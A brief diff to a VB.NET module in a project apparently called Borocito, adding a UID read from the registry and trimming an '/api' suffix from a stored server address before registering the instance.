@@ -33,11 +33,13 @@ Module Utility
 End Module
 Module Memory
     Public regKey As RegistryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Borocito", True)
+    Public UID As String
     Public OwnerServer As String
     Sub LoadRegedit()
         Try
             AddToLog("LoadRegedit@Memory", "Loading data...", False)
-            OwnerServer = regKey.GetValue("OwnerServer").ToString().Replace("http://", "").Replace("https://", "").Replace("/Borocito", "")
+            OwnerServer = regKey.GetValue("OwnerServer").ToString().Replace("http://", "").Replace("https://", "").Replace("/Borocito", "").Replace("/api", "")
+            UID = regKey.GetValue("UID").ToString()
             RegisterInstance()
         Catch ex As Exception
             AddToLog("LoadRegedit@Memory", "Error: " & ex.Message, True)
